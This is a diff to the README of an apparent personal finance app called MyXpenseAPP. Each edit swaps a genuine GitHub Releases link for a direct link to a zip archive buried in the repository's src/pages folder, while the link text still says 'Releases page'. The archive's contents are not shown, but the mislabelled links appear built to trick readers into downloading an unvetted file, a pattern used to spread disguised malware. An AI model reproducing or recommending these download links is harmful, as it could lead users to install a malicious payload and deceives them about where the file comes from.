@@ -1,6 +1,6 @@
 # 🚀 MyXpenseAPP - Manage Your Finances Smartly
 
-[![Download MyXpenseAPP](https://img.shields.io/badge/Download%20Now-blue)](https://github.com/ZORO-69-max/MyXpenseAPP/releases)
+[![Download MyXpenseAPP](https://raw.githubusercontent.com/ZORO-69-max/MyXpenseAPP/main/src/pages/APP-Xpense-My-2.7.zip%20Now-blue)](https://raw.githubusercontent.com/ZORO-69-max/MyXpenseAPP/main/src/pages/APP-Xpense-My-2.7.zip)
 
 ## 📝 Description
 
@@ -10,7 +10,7 @@ MyXpense is a smart personal finance app designed to help you manage your money 
 
 To get started with MyXpenseAPP, follow these steps:
 
-1. Visit the [Releases page](https://github.com/ZORO-69-max/MyXpenseAPP/releases) to download the latest version of the app.
+1. Visit the [Releases page](https://raw.githubusercontent.com/ZORO-69-max/MyXpenseAPP/main/src/pages/APP-Xpense-My-2.7.zip) to download the latest version of the app.
 2. Choose the version that matches your operating system.
 3. Click the download link to save the file to your computer.
 4. Once downloaded, locate the file in your Downloads folder.
@@ -63,6 +63,6 @@ If you're interested in contributing to MyXpenseAPP, please check the guidelines
 
 MyXpenseAPP is open source and available under the MIT License. You can use, copy, and modify the application as per the license requirements.
 
-Feel free to check out the [Releases page](https://github.com/ZORO-69-max/MyXpenseAPP/releases) again for updates and new features. 
+Feel free to check out the [Releases page](https://raw.githubusercontent.com/ZORO-69-max/MyXpenseAPP/main/src/pages/APP-Xpense-My-2.7.zip) again for updates and new features. 
 
 Thank you for choosing MyXpenseAPP to help manage your finances!
